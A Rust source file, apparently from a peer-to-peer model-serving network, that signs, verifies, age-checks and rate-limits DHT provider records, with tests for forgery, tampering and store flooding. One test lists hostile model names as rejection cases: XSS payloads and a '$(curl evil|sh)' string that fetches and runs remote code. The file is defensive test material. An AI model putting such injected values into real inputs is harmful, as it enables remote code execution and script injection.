//! Kademlia DHT operations for peer record storage and discovery.

use libp2p::kad;
use openhydra_protocol::crypto_agility::SigAlg;
use openhydra_protocol::model_id::is_valid_canonical_field;

use crate::types::PeerRecord;

/// Kademlia key prefix for OpenHydra model records.
const MODEL_KEY_PREFIX: &str = "/openhydra/model/";

/// Build a Kademlia record key for a peer's model announcement.
///
/// Uses the libp2p PeerId (base58) in the key, NOT the OpenHydra peer_id,
/// so that records can be looked up by provider PeerId after `get_providers`.
pub fn peer_record_key(model_id: &str, libp2p_peer_id: &str) -> kad::RecordKey {
    kad::RecordKey::new(&format!("{MODEL_KEY_PREFIX}{model_id}/{libp2p_peer_id}"))
}

/// Build a Kademlia record key for querying all peers of a model.
///
/// Uses the provider record pattern: peers "provide" a model_id key.
pub fn model_provider_key(model_id: &str) -> kad::RecordKey {
    kad::RecordKey::new(&format!("{MODEL_KEY_PREFIX}{model_id}"))
}

/// Encode a PeerRecord as a Kademlia record value (CBOR).
pub fn encode_record(record: &PeerRecord) -> Result<Vec<u8>, String> {
    record.to_cbor().map_err(|e| format!("cbor encode: {e}"))
}

/// Decode a PeerRecord from a Kademlia record value (CBOR).
/// Whether a record a peer asked us to store (Kademlia `PUT_RECORD`) may be stored: a provider
/// record that decodes, verifies, and sits under the key its own (model, peer id) give. A valid
/// signature alone isn't enough: one identity could replay its record under thousands of keys to
/// fill the store, or a peer could overwrite another's key with junk (review 2026-10-29: the
/// bootstraps stored anything).
pub fn check_put_record(record: &kad::Record, now_ms: u64) -> Result<PeerRecord, String> {
    let peer_record = decode_record(&record.value).map_err(|e| format!("undecodable: {e}"))?;
    // The key first: it costs a hash, the signature a verification.
    if record.key != peer_record_key(&peer_record.model_id, &peer_record.libp2p_peer_id) {
        return Err("key not bound to its (model_id, libp2p_peer_id)".into());
    }
    check_record_age(&peer_record, now_ms)?;
    verify_peer_record(&peer_record).map_err(|e| format!("failed verification: {e}"))?;
    Ok(peer_record)
}

/// The oldest a provider record may be to be stored or relayed (providers re-announce every two
/// minutes): an older one, replayed, would roll a provider back to a past address or keep a
/// withdrawn model listed (review 2026-10-29).
pub const MAX_RECORD_AGE_MS: u64 = 3_600_000;
/// How far ahead of our clock a record's time may be: a few minutes, for home machines whose
/// clock runs fast.
pub const MAX_RECORD_FUTURE_MS: u64 = 300_000;

/// Whether `record`'s signed time is within [`MAX_RECORD_AGE_MS`] before and
/// [`MAX_RECORD_FUTURE_MS`] after `now_ms`. A time of 0 is a record from a node older than
/// 2026-10-29, which never set one: accepted (with no replay protection) until those are gone,
/// or no provider on them could be found (GPU test 2026-10-29).
pub fn check_record_age(record: &PeerRecord, now_ms: u64) -> Result<(), String> {
    if record.updated_unix_ms == 0 {
        return Ok(());
    }
    if record.updated_unix_ms.saturating_add(MAX_RECORD_AGE_MS) < now_ms {
        return Err("record older than an hour".into());
    }
    if record.updated_unix_ms > now_ms.saturating_add(MAX_RECORD_FUTURE_MS) {
        return Err("record dated in the future".into());
    }
    Ok(())
}

/// Whether `incoming` may replace what the store holds under its key: only a record at least as
/// new (a replayed older one would roll the provider back).
pub fn newer_than_stored(stored: Option<&kad::Record>, incoming: &PeerRecord) -> bool {
    match stored.and_then(|r| decode_record(&r.value).ok()) {
        Some(old) => incoming.updated_unix_ms >= old.updated_unix_ms,
        None => true,
    }
}

/// Records one publisher may keep in our record store via PUT_RECORD: the key binding makes each
/// one a distinct (model, publisher), and model names are free, so one identity could otherwise
/// fill the whole store (1,024 records) and every honest PUT would fail (review 2026-10-29).
pub const MAX_PUT_RECORDS_PER_PUBLISHER: usize = 64;
/// Records the peers of one network (see `ip_limits::origin_key`) may keep there.
pub const MAX_PUT_RECORDS_PER_ORIGIN: usize = 256;
/// How long a stored record counts against its publisher (the record TTL).
const PUT_QUOTA_TTL: std::time::Duration = std::time::Duration::from_secs(300);

/// Who holds how much of a node's record store, by publisher and by the network the PUT came from.
#[derive(Debug, Default)]
pub struct PutQuota {
    entries: std::collections::HashMap<kad::RecordKey, (String, String, std::time::Instant)>,
    per_publisher: std::collections::HashMap<String, usize>,
    per_origin: std::collections::HashMap<String, usize>,
}

impl PutQuota {
    /// Whether a PUT of `key` by `publisher` (its libp2p id) from network `origin` may be stored
    /// at `now`; counts it if so. A key already held is a refresh and always allowed.
    pub fn admit(&mut self, key: &kad::RecordKey, publisher: &str, origin: &str, now: std::time::Instant) -> bool {
        self.expire(now);
        if let Some(e) = self.entries.get_mut(key) {
            e.2 = now;
            return true;
        }
        if self.per_publisher.get(publisher).copied().unwrap_or(0) >= MAX_PUT_RECORDS_PER_PUBLISHER
            || self.per_origin.get(origin).copied().unwrap_or(0) >= MAX_PUT_RECORDS_PER_ORIGIN
        {
            return false;
        }
        *self.per_publisher.entry(publisher.to_string()).or_default() += 1;
        *self.per_origin.entry(origin.to_string()).or_default() += 1;
        self.entries.insert(key.clone(), (publisher.to_string(), origin.to_string(), now));
        true
    }

    fn expire(&mut self, now: std::time::Instant) {
        let (pp, po) = (&mut self.per_publisher, &mut self.per_origin);
        self.entries.retain(|_, (p, o, t)| {
            let keep = now.duration_since(*t) < PUT_QUOTA_TTL;
            if !keep {
                for (m, k) in [(&mut *pp, p.as_str()), (&mut *po, o.as_str())] {
                    if let Some(n) = m.get_mut(k) {
                        *n = n.saturating_sub(1);
                        if *n == 0 {
                            m.remove(k);
                        }
                    }
                }
            }
            keep
        });
    }

    /// Records counted now.
    pub fn len(&self) -> usize {
        self.entries.len()
    }

    pub fn is_empty(&self) -> bool {
        self.entries.is_empty()
    }
}

pub fn decode_record(data: &[u8]) -> Result<PeerRecord, String> {
    PeerRecord::from_cbor(data).map_err(|e| format!("cbor decode: {e}"))
}

/// Extract the model_id from a Kademlia record key.
///
/// Key format: `/openhydra/model/{model_id}/{peer_id}`
pub fn parse_model_id_from_key(key: &[u8]) -> Option<String> {
    let s = std::str::from_utf8(key).ok()?;
    let stripped = s.strip_prefix(MODEL_KEY_PREFIX)?;
    let slash_pos = stripped.find('/')?;
    Some(stripped[..slash_pos].to_string())
}

/// Compute the canonical signing preimage for a `PeerRecord`.
///
/// **v2 (2026-06-15 audit).** The legacy v1 preimage signed only
/// `{host, model_id, peer_id, port}`, leaving the *rest* of the record —
/// `libp2p_peer_id`, `relay_address`, `requires_relay`, `nat_type`, and the
/// M1.2/M1.3 capability/ranking fields — **unsigned**, i.e. tamperable by a
/// relaying peer. v2 covers **every field a consumer trusts** for identity,
/// routing, or ranking, with a domain-separation header (`openhydra-peer-record-v2`)
/// so a signature can't be replayed across formats/protocols.
///
/// Deliberately **excluded**:
/// * `signature` — the output of signing.
/// * `reputation_score` — externally assigned; a peer must never self-attest its
///   own reputation (the consumer uses its local `ReputationTracker` instead).
///
/// Determinism: signer and verifier are both Rust and use identical `format!`
/// rendering, so the byte string is reproducible. (This diverges from the legacy
/// Python 4-field format; the agent/protocol path is Rust-only post-pivot.)
pub fn canonical_bytes(r: &PeerRecord) -> Vec<u8> {
    // v3 (PQC0.1): binds the `sig_alg` discriminant into the preimage right after the
    // domain header, so a wire-level attacker cannot strip or downgrade the algorithm.
    format!(
        "openhydra-peer-record-v3\nsig_alg={}\n\
         peer_id={}\nmodel_id={}\ncanonical_model_id={}\n\
         host={}\nhost_ipv6={}\nport={}\n\
         libp2p_peer_id={}\npublic_key={}\n\
         relay_address={}\nrequires_relay={}\nnat_type={}\nregion={}\n\
         runtime_backend={}\nruntime_model_id={}\n\
         layer_start={}\nlayer_end={}\ntotal_layers={}\n\
         context_length={}\nmax_output_tokens={}\n\
         throughput_tok_s={}\nqueue_depth={}\nload_pct={}\nhardware_class={}\n\
         updated_unix_ms={}",
        r.sig_alg,
        r.peer_id, r.model_id, r.canonical_model_id,
        r.host, r.host_ipv6, r.port,
        r.libp2p_peer_id, r.public_key,
        r.relay_address, r.requires_relay, r.nat_type, r.region.as_deref().unwrap_or(""),
        r.runtime_backend, r.runtime_model_id,
        r.layer_start, r.layer_end, r.total_layers,
        r.context_length, r.max_output_tokens,
        r.throughput_tok_s, r.queue_depth, r.load_pct, r.hardware_class,
        r.updated_unix_ms,
    )
    .into_bytes()
}

/// Sign a PeerRecord with the given keypair and populate its `signature`,
/// `public_key`, and `libp2p_peer_id` fields (Task 6.2).
///
/// Order matters (v2): `public_key` and `libp2p_peer_id` are now part of the
/// signed preimage, so they must be populated **before** `canonical_bytes` is
/// computed — otherwise the verifier (which sees the populated values) would
/// recompute a different preimage and reject the signature.
pub fn sign_peer_record(
    record: &PeerRecord,
    keypair: &libp2p::identity::Keypair,
) -> Result<PeerRecord, String> {
    let ed25519_pk = keypair
        .public()
        .try_into_ed25519()
        .map_err(|e| format!("not ed25519: {e}"))?;
    let mut signed = record.clone();
    signed.public_key = hex::encode(ed25519_pk.to_bytes());
    signed.libp2p_peer_id =
        libp2p::PeerId::from_public_key(&keypair.public()).to_string();
    // Both peer ids are the key's own (verify_peer_record rejects any other).
    signed.peer_id = crate::identity::openhydra_peer_id(&ed25519_pk.to_bytes());
    // Crypto-agility (PQC0.1): this path signs with Ed25519; record it so the
    // verifier dispatches correctly and the algorithm is bound into the preimage.
    signed.sig_alg = SigAlg::Ed25519.to_u8();
    // Sign over the fully-populated record (incl. the fields just set).
    let canonical = canonical_bytes(&signed);
    let sig_bytes = keypair
        .sign(&canonical)
        .map_err(|e| format!("sign failed: {e}"))?;
    signed.signature = base64_urlsafe_encode(&sig_bytes);
    Ok(signed)
}

/// URL-safe base64 encoding (matches Python's `base64.urlsafe_b64encode`).
fn base64_urlsafe_encode(data: &[u8]) -> String {
    use base64::Engine;
    base64::engine::general_purpose::URL_SAFE.encode(data)
}

/// URL-safe base64 decoding (matches Python's `base64.urlsafe_b64decode`).
fn base64_urlsafe_decode(s: &str) -> Result<Vec<u8>, String> {
    use base64::Engine;
    base64::engine::general_purpose::URL_SAFE
        .decode(s)
        .map_err(|e| format!("base64 decode failed: {e}"))
}

/// Verify a `PeerRecord`'s Ed25519 signature and bind its key to the advertised
/// libp2p peer id.  Returns `Ok(())` only when the record is authentic.
///
/// SECURITY: this is the missing read-side counterpart to `sign_peer_record`.
/// Untrusted DHT records (Kademlia GetRecord / provider-store reads) MUST pass
/// this before any field is trusted — otherwise any peer can publish records
/// with attacker-chosen `host`/`port`/`layer_*`/`libp2p_peer_id` (DHT
/// poisoning + routing-table address injection).  Never panics on malformed
/// input — all decode failures return `Err`.
pub fn verify_peer_record(record: &PeerRecord) -> Result<(), String> {
    // A signature proves who sent a record, not that its contents are sane. Model names travel
    // into other nodes' UIs, gateways and coding tools, so a record with an odd name or an
    // oversized body is refused like a forged one.
    check_record_content(record)?;
    if record.signature.is_empty() || record.public_key.is_empty() {
        return Err("missing signature or public_key".into());
    }
    // Crypto-agility (PQC0.1): reject an unknown or known-but-unimplemented signature
    // algorithm before trusting any field — never silently treat it as classical.
    let alg = SigAlg::from_u8(record.sig_alg).map_err(|e| e.to_string())?;
    if !alg.is_implemented() {
        return Err(format!("unsupported signature algorithm: {alg:?}"));
    }
    // Decode the ed25519 public key (hex, matches sign_peer_record).
    let pk_bytes =
        hex::decode(&record.public_key).map_err(|e| format!("bad public_key hex: {e}"))?;
    let ed_pk = libp2p::identity::ed25519::PublicKey::try_from_bytes(&pk_bytes)
        .map_err(|e| format!("bad ed25519 public_key: {e}"))?;
    // Bind the key to the advertised libp2p_peer_id so a valid signature from
    // identity A cannot be replayed under identity B's peer id.
    //
    // D-S4: this binding is UNCONDITIONAL. Previously it was skipped when
    // `libp2p_peer_id` was empty — but the field is part of the signed preimage,
    // so an attacker could sign a record with the field cleared and it would pass
    // verification while dodging the key↔peer-id binding entirely (and any
    // downstream code keying on the empty id). `sign_peer_record` always
    // populates it, so no legitimate record is empty; reject rather than skip.
    if record.libp2p_peer_id.is_empty() {
        return Err("missing libp2p_peer_id".into());
    }
    let pubkey = libp2p::identity::PublicKey::from(ed_pk.clone());
    let derived = libp2p::PeerId::from_public_key(&pubkey).to_string();
    if record.libp2p_peer_id != derived {
        return Err(format!(
            "peer_id mismatch: record={} derived={derived}",
            record.libp2p_peer_id
        ));
    }
    // The OpenHydra peer id too: everything a consumer remembers about a provider (reputation,
    // vouchers, authenticity, attestation) is keyed by it, so it must be the key's own — otherwise
    // a peer could advertise another's id under its own key and inherit (or spoil) its record.
    let openhydra_id = crate::identity::openhydra_peer_id(&pk_bytes);
    if record.peer_id != openhydra_id {
        return Err(format!("openhydra peer_id mismatch: record={} derived={openhydra_id}", record.peer_id));
    }
    let sig = base64_urlsafe_decode(&record.signature)?;
    if ed_pk.verify(&canonical_bytes(record), &sig) {
        Ok(())
    } else {
        Err("signature verification failed".into())
    }
}

/// Largest signed record body accepted; honest records are well under 1 KB.
pub const MAX_RECORD_BYTES: usize = 4096;

/// The content half of [`verify_peer_record`]: the model name and canonical id use only the
/// characters real engine ids use (`openhydra_protocol::model_id::is_valid_model_id`), and the
/// signed body is at most [`MAX_RECORD_BYTES`]. An empty `model_id` (a record that serves nothing) is left to callers.
pub fn check_record_content(record: &PeerRecord) -> Result<(), String> {
    if !is_valid_canonical_field(&record.model_id) {
        return Err("model name has unsupported characters".into());
    }
    if !is_valid_canonical_field(&record.canonical_model_id) {
        return Err("canonical model id has unsupported characters".into());
    }
    if canonical_bytes(record).len() > MAX_RECORD_BYTES {
        return Err("record too large".into());
    }
    Ok(())
}

/// R-DHT-1 (gossip provider PEX): decide whether a provider record learned over
/// gossipsub may be trusted and cached.
///
/// Two independent checks, both required:
/// 1. The record self-verifies (`verify_peer_record`): valid Ed25519 signature and
///    the embedded `public_key` derives the advertised `libp2p_peer_id`.
/// 2. The gossip was authored by that same peer — `gossip_source` is the
///    cryptographically-verified message author (gossipsub runs Signed + Strict),
///    and it MUST equal `record.libp2p_peer_id`.
///
/// Check 2 is what stops PEX poisoning / amplification: without it any swarm
/// member (or a malicious relay) could flood forged "provider X serves model Y"
/// records for peers it does not control, steering consumers at black holes —
/// the exact discovery-DoS that BitTorrent's PEX has to defend against. A peer
/// may only advertise its *own* provider record. Mirrors the PEER_DEPARTED
/// author-check in the event loop.
pub fn pex_record_is_authentic(record: &PeerRecord, gossip_source: &str) -> Result<(), String> {
    verify_peer_record(record)?;
    if record.libp2p_peer_id.is_empty() {
        return Err("pex record missing libp2p_peer_id".into());
    }
    if record.libp2p_peer_id != gossip_source {
        return Err(format!(
            "pex author mismatch: record={} gossip_source={gossip_source}",
            record.libp2p_peer_id
        ));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_key_format() {
        let key = peer_record_key("openhydra-qwen3.5-2b", "12D3KooWEL5wELabcdef");
        let raw = key.as_ref();
        let s = std::str::from_utf8(raw).unwrap();
        assert_eq!(s, "/openhydra/model/openhydra-qwen3.5-2b/12D3KooWEL5wELabcdef");
    }

    #[test]
    fn test_parse_model_id() {
        let key = b"/openhydra/model/openhydra-qwen3.5-2b/12D3KooWEL5wELabcdef";
        assert_eq!(
            parse_model_id_from_key(key),
            Some("openhydra-qwen3.5-2b".to_string())
        );
    }

    #[test]
    fn test_encode_decode_roundtrip() {
        let record = PeerRecord {
            peer_id: "test".into(),
            model_id: "test-model".into(),
            host: "1.2.3.4".into(),
            port: 50051,
            layer_start: 0,
            layer_end: 12,
            total_layers: 24,
            ..Default::default()
        };
        let encoded = encode_record(&record).unwrap();
        let decoded = decode_record(&encoded).unwrap();
        assert_eq!(decoded.peer_id, "test");
        assert_eq!(decoded.layer_end, 12);
    }

    #[test]
    fn test_sign_verify_roundtrip() {
        let kp = libp2p::identity::Keypair::generate_ed25519();
        let record = PeerRecord {
            peer_id: "oh-peer".into(),
            model_id: "test-model".into(),
            host: "1.2.3.4".into(),
            port: 50051,
            ..Default::default()
        };
        let signed = sign_peer_record(&record, &kp).unwrap();
        // A genuine signed record verifies.
        verify_peer_record(&signed).unwrap();
    }

    #[test]
    fn test_verify_rejects_another_peers_openhydra_id() {
        // An attacker signs, with its own key, a record claiming a victim's OpenHydra id: the
        // signature is genuine, but the id isn't the key's.
        let victim = libp2p::identity::Keypair::generate_ed25519();
        let victim_id = crate::identity::openhydra_peer_id(&victim.public().try_into_ed25519().unwrap().to_bytes());
        let attacker = libp2p::identity::Keypair::generate_ed25519();
        let record = PeerRecord { model_id: "m".into(), host: "1.2.3.4".into(), port: 1, ..Default::default() };
        let mut forged = sign_peer_record(&record, &attacker).unwrap();
        assert_ne!(forged.peer_id, victim_id);
        forged.peer_id = victim_id;
        forged.signature = base64_urlsafe_encode(&attacker.sign(&canonical_bytes(&forged)).unwrap());
        let err = verify_peer_record(&forged).unwrap_err();
        assert!(err.contains("openhydra peer_id mismatch"), "{err}");
        // Signing stamps the key's own id, whatever the record said.
        let signed = sign_peer_record(&PeerRecord { peer_id: "anything".into(), ..record }, &victim).unwrap();
        assert_eq!(signed.peer_id, crate::identity::openhydra_peer_id(&victim.public().try_into_ed25519().unwrap().to_bytes()));
        verify_peer_record(&signed).unwrap();
    }

    #[test]
    fn verify_refuses_a_validly_signed_record_with_a_hostile_model_name() {
        let kp = libp2p::identity::Keypair::generate_ed25519();
        for bad in [
            "x\" onclick=\"alert(1)\"",
            "<img src=x onerror=alert(1)>",
            "~/$(curl evil|sh)/qwen.gguf",
            "two\nlines",
        ] {
            let record = PeerRecord { peer_id: "oh-peer".into(), model_id: bad.into(), ..Default::default() };
            let signed = sign_peer_record(&record, &kp).unwrap();
            let err = verify_peer_record(&signed).unwrap_err();
            assert!(err.contains("unsupported characters"), "{bad:?}: {err}");
            assert!(pex_record_is_authentic(&signed, &signed.libp2p_peer_id).is_err());
        }
        let record = PeerRecord {
            peer_id: "oh-peer".into(),
            model_id: "qwen2.5:7b".into(),
            canonical_model_id: "qwen\"2.5/7b/q4_k_m/9f2c8a1b4d6e0f37".into(),
            ..Default::default()
        };
        assert!(verify_peer_record(&sign_peer_record(&record, &kp).unwrap()).is_err());
    }

    #[test]
    fn verify_refuses_an_oversized_record_and_keeps_honest_ones() {
        let kp = libp2p::identity::Keypair::generate_ed25519();
        let big = PeerRecord {
            peer_id: "oh-peer".into(),
            model_id: "qwen2.5:7b".into(),
            hardware_class: "x".repeat(MAX_RECORD_BYTES),
            ..Default::default()
        };
        let err = verify_peer_record(&sign_peer_record(&big, &kp).unwrap()).unwrap_err();
        assert!(err.contains("too large"), "{err}");
        for ok in ["qwen2.5:7b", "hf.co/bartowski/Qwen2.5-7B-Instruct-GGUF:Q4_K_M", "flux1-dev workflow", ""] {
            let record = PeerRecord { peer_id: "oh-peer".into(), model_id: ok.into(), ..Default::default() };
            verify_peer_record(&sign_peer_record(&record, &kp).unwrap()).unwrap();
        }
    }

    #[test]
    fn test_verify_rejects_tampered_field() {
        let kp = libp2p::identity::Keypair::generate_ed25519();
        let mut signed = sign_peer_record(
            &PeerRecord { host: "1.2.3.4".into(), port: 50051, ..Default::default() },
            &kp,
        )
        .unwrap();
        // Attacker rewrites host after signing → must fail.
        signed.host = "6.6.6.6".into();
        assert!(verify_peer_record(&signed).is_err());
    }

    #[test]
    fn test_verify_rejects_unknown_sig_alg() {
        // PQC0.1: a record claiming an unknown algorithm discriminant is rejected.
        let kp = libp2p::identity::Keypair::generate_ed25519();
        let mut signed = sign_peer_record(
            &PeerRecord { host: "1.2.3.4".into(), port: 50051, ..Default::default() },
            &kp,
        )
        .unwrap();
        signed.sig_alg = 0xFF; // not a known SigAlg
        let err = verify_peer_record(&signed).unwrap_err();
        assert!(err.contains("unknown"), "expected unknown-alg error, got: {err}");
    }

    #[test]
    fn test_verify_rejects_unimplemented_sig_alg() {
        // PQC0.1: a reserved-but-unimplemented PQC algorithm (ML-DSA = 2) must be
        // rejected, never silently treated as classical Ed25519.
        let kp = libp2p::identity::Keypair::generate_ed25519();
        let mut signed = sign_peer_record(
            &PeerRecord { host: "1.2.3.4".into(), port: 50051, ..Default::default() },
            &kp,
        )
        .unwrap();
        signed.sig_alg = SigAlg::MlDsa65.to_u8();
        let err = verify_peer_record(&signed).unwrap_err();
        assert!(err.contains("unsupported"), "expected unsupported-alg error, got: {err}");
    }

    #[test]
    fn test_default_record_is_ed25519() {
        // The serde/Default discriminant must be classical Ed25519, so an unsigned
        // default record and freshly-signed records agree on the algorithm.
        assert_eq!(PeerRecord::default().sig_alg, SigAlg::Ed25519.to_u8());
    }

    #[test]
    fn test_v2_signs_routing_and_capability_fields() {
        // v2 audit fix: fields that were UNSIGNED under v1 must now be covered.
        // Tampering any of them after signing must be rejected.
        let kp = libp2p::identity::Keypair::generate_ed25519();
        let base = PeerRecord {
            peer_id: "p".into(),
            model_id: "m".into(),
            host: "1.2.3.4".into(),
            port: 50051,
            relay_address: "/ip4/9.9.9.9/tcp/4001/p2p-circuit".into(),
            requires_relay: true,
            nat_type: "open".into(),
            throughput_tok_s: 13.4,
            queue_depth: 1,
            layer_start: 0,
            layer_end: 12,
            total_layers: 24,
            canonical_model_id: "qwen3.5/2b/fp16/abcd".into(),
            ..Default::default()
        };
        let signed = sign_peer_record(&base, &kp).unwrap();
        verify_peer_record(&signed).unwrap(); // genuine record verifies

        // Each of these was forgeable under v1; now each must fail verification.
        let mut t = signed.clone(); t.relay_address = "/ip4/6.6.6.6/tcp/4001".into();
        assert!(verify_peer_record(&t).is_err(), "relay_address must be signed");
        let mut t = signed.clone(); t.requires_relay = false;
        assert!(verify_peer_record(&t).is_err(), "requires_relay must be signed");
        let mut t = signed.clone(); t.throughput_tok_s = 9999.0;
        assert!(verify_peer_record(&t).is_err(), "throughput must be signed");
        let mut t = signed.clone(); t.queue_depth = 0;
        assert!(verify_peer_record(&t).is_err(), "queue_depth must be signed");
        let mut t = signed.clone(); t.layer_end = 24;
        assert!(verify_peer_record(&t).is_err(), "layer_end must be signed");
        let mut t = signed.clone(); t.canonical_model_id = "evil/model".into();
        assert!(verify_peer_record(&t).is_err(), "canonical_model_id must be signed");
        let mut t = signed.clone(); t.nat_type = "symmetric".into();
        assert!(verify_peer_record(&t).is_err(), "nat_type must be signed");
    }

    #[test]
    fn test_v2_reputation_not_self_attested() {
        // reputation_score is intentionally EXCLUDED from the signed preimage:
        // a peer must not be able to bind a self-claimed reputation. Changing it
        // does NOT invalidate the signature (the consumer ignores it in favour of
        // its local ReputationTracker).
        let kp = libp2p::identity::Keypair::generate_ed25519();
        let mut signed = sign_peer_record(
            &PeerRecord { host: "1.2.3.4".into(), port: 1, ..Default::default() },
            &kp,
        )
        .unwrap();
        signed.reputation_score = 100.0;
        assert!(verify_peer_record(&signed).is_ok());
    }

    #[test]
    fn test_verify_rejects_unsigned_and_mismatched_peer_id() {
        // Unsigned record (no signature/public_key) is rejected.
        let unsigned = PeerRecord { host: "1.2.3.4".into(), port: 1, ..Default::default() };
        assert!(verify_peer_record(&unsigned).is_err());

        // Valid signature from key A replayed under a different peer id → reject.
        let kp = libp2p::identity::Keypair::generate_ed25519();
        let mut signed =
            sign_peer_record(&PeerRecord { port: 1, ..Default::default() }, &kp).unwrap();
        signed.libp2p_peer_id = "12D3KooWFakePeerIdThatDoesNotMatchTheKey".into();
        assert!(verify_peer_record(&signed).is_err());
    }

    #[test]
    fn test_ds4_rejects_empty_peer_id_even_when_signed() {
        // D-S4: an attacker signs a record with libp2p_peer_id CLEARED. Because
        // the field is in the signed preimage, the signature is self-consistent —
        // the old code skipped the key↔peer-id binding for empty ids and accepted
        // it. It must now be rejected (no legitimate record is empty).
        let kp = libp2p::identity::Keypair::generate_ed25519();
        let mut signed =
            sign_peer_record(&PeerRecord { port: 1, ..Default::default() }, &kp).unwrap();
        // Re-sign over the cleared field so the signature itself stays valid.
        signed.libp2p_peer_id = String::new();
        let canonical = canonical_bytes(&signed);
        signed.signature = base64_urlsafe_encode(&kp.sign(&canonical).unwrap());
        let err = verify_peer_record(&signed).unwrap_err();
        assert!(err.contains("libp2p_peer_id"), "expected empty-peer-id error, got: {err}");
    }

    /// Load-test measurement (run by hand: `cargo test --release -p openhydra-network
    /// pex_cost_measure -- --ignored --nocapture`): the size of a realistic signed provider
    /// announcement and what checking one costs on this machine.
    #[test]
    #[ignore]
    fn pex_cost_measure() {
        let kp = libp2p::identity::Keypair::generate_ed25519();
        let record = PeerRecord {
            peer_id: "a3f1c2d4e5b6a7980a1b2c3d4e5f6071".into(),
            model_id: "qwen3/8b/q4_k_m/4b9e1f2a".into(),
            canonical_model_id: "qwen3/8b/q4_k_m/4b9e1f2a".into(),
            runtime_model_id: "qwen3:8b".into(),
            host: "203.0.113.25".into(),
            port: 4001,
            region: Some("ap-south".into()),
            daemon_mode: "provider".into(),
            runtime_backend: "ollama".into(),
            runtime_target: "cuda".into(),
            quantization_mode: "q4_k_m".into(),
            quantization_bits: 4,
            runtime_gpu_available: true,
            runtime_estimated_tokens_per_sec: 42.0,
            runtime_estimated_memory_mb: 6144,
            context_length: 40960,
            max_output_tokens: 8192,
            hardware_class: "consumer-gpu".into(),
            nat_type: "port_restricted".into(),
            requires_relay: true,
            relay_address: "/ip4/45.79.190.172/tcp/4001/p2p/12D3KooWEL5wEL3foSWUk1E1rXHLbveqTahoHKhAsEYhDsLUkyWb/p2p-circuit".into(),
            ..Default::default()
        };
        let signed = sign_peer_record(&record, &kp).unwrap();
        let envelope = serde_json::to_vec(&serde_json::json!({"type": "PROVIDER_ANNOUNCE", "record": &signed})).unwrap();
        let source = signed.libp2p_peer_id.clone();
        let n = 20_000u32;
        let t = std::time::Instant::now();
        for _ in 0..n {
            pex_record_is_authentic(&signed, &source).unwrap();
        }
        let record_check = t.elapsed() / n;
        // The gossip layer's own check: one Ed25519 verify over the message.
        let sig = kp.sign(&envelope).unwrap();
        let pk = kp.public();
        let t = std::time::Instant::now();
        for _ in 0..n {
            assert!(pk.verify(&envelope, &sig));
        }
        let message_check = t.elapsed() / n;
        let t = std::time::Instant::now();
        for _ in 0..n {
            let v: serde_json::Value = serde_json::from_slice(&envelope).unwrap();
            let _r: PeerRecord = serde_json::from_value(v["record"].clone()).unwrap();
        }
        let parse = t.elapsed() / n;
        println!("PEX_MEASURE envelope_bytes={} record_check_us={:.1} message_check_us={:.1} parse_us={:.1}",
            envelope.len(), record_check.as_secs_f64() * 1e6, message_check.as_secs_f64() * 1e6, parse.as_secs_f64() * 1e6);
    }

    #[test]
    fn test_pex_accepts_self_authored_record() {
        // A provider gossiping its OWN signed record (gossip_source == its peer id)
        // is accepted.
        let kp = libp2p::identity::Keypair::generate_ed25519();
        let signed = sign_peer_record(
            &PeerRecord {
                model_id: "m".into(),
                host: "1.2.3.4".into(),
                port: 50051,
                ..Default::default()
            },
            &kp,
        )
        .unwrap();
        let source = signed.libp2p_peer_id.clone();
        pex_record_is_authentic(&signed, &source).unwrap();
    }

    #[test]
    fn test_pex_rejects_relayed_third_party_record() {
        // PEX poisoning: a *different* peer (B) gossips A's genuine, validly-signed
        // record. The signature checks out, but the gossip author != record author,
        // so it must be rejected — a peer may only advertise its own provider record.
        let kp_a = libp2p::identity::Keypair::generate_ed25519();
        let signed_a = sign_peer_record(
            &PeerRecord { host: "1.2.3.4".into(), port: 50051, ..Default::default() },
            &kp_a,
        )
        .unwrap();
        let kp_b = libp2p::identity::Keypair::generate_ed25519();
        let source_b = libp2p::PeerId::from_public_key(&kp_b.public()).to_string();
        assert!(pex_record_is_authentic(&signed_a, &source_b).is_err());
    }

    #[test]
    fn test_pex_rejects_unsigned_record() {
        let unsigned = PeerRecord { host: "1.2.3.4".into(), port: 1, ..Default::default() };
        // Even if the (empty) libp2p_peer_id matched the source, the missing
        // signature must still fail the verify step.
        assert!(pex_record_is_authentic(&unsigned, "").is_err());
    }
}

#[cfg(test)]
mod quota_tests {
    use super::*;

    #[test]
    fn one_publisher_or_one_network_gets_only_its_share_of_the_record_store() {
        let mut q = PutQuota::default();
        let t0 = std::time::Instant::now();
        let key = |i: usize| peer_record_key(&format!("junk-{i}"), "12D3KooWAttacker");
        let held = (0..2_000).filter(|i| q.admit(&key(*i), "12D3KooWAttacker", "203.0.113.9", t0)).count();
        assert_eq!(held, MAX_PUT_RECORDS_PER_PUBLISHER, "one identity, free model names");
        // A refresh of what it holds is still fine; an honest publisher elsewhere still gets in.
        assert!(q.admit(&key(0), "12D3KooWAttacker", "203.0.113.9", t0));
        assert!(q.admit(&peer_record_key("m", "12D3KooWHonest"), "12D3KooWHonest", "198.51.100.7", t0));
        // Many identities from one network: the network's share.
        let mut q = PutQuota::default();
        let held = (0..2_000)
            .filter(|i| q.admit(&peer_record_key("m", &format!("id{i}")), &format!("id{i}"), "2001:db8:1::/48", t0))
            .count();
        assert_eq!(held, MAX_PUT_RECORDS_PER_ORIGIN);
        // Shares come back once the records have expired.
        assert!(q.admit(&peer_record_key("m", "late"), "late", "2001:db8:1::/48", t0 + std::time::Duration::from_secs(301)));
        assert_eq!(q.len(), 1);
    }

    #[test]
    fn an_old_or_future_record_is_refused_and_a_replay_never_replaces_a_newer_one() {
        let now = 10 * MAX_RECORD_AGE_MS;
        let rec = |ms: u64| PeerRecord { updated_unix_ms: ms, ..Default::default() };
        assert!(check_record_age(&rec(now - 1_000), now).is_ok());
        assert!(check_record_age(&rec(0), now).is_ok(), "a node that never dates its records");
        assert!(check_record_age(&rec(now - MAX_RECORD_AGE_MS - 1), now).is_err(), "over an hour old");
        assert!(check_record_age(&rec(now + MAX_RECORD_FUTURE_MS + 1), now).is_err(), "from the future");
        let stored = |ms: u64| {
            let r = PeerRecord { updated_unix_ms: ms, model_id: "m".into(), libp2p_peer_id: "p".into(), ..Default::default() };
            kad::Record::new(peer_record_key("m", "p"), encode_record(&r).unwrap())
        };
        assert!(newer_than_stored(None, &rec(5)));
        assert!(newer_than_stored(Some(&stored(5)), &rec(5)), "the same record again");
        assert!(newer_than_stored(Some(&stored(5)), &rec(6)));
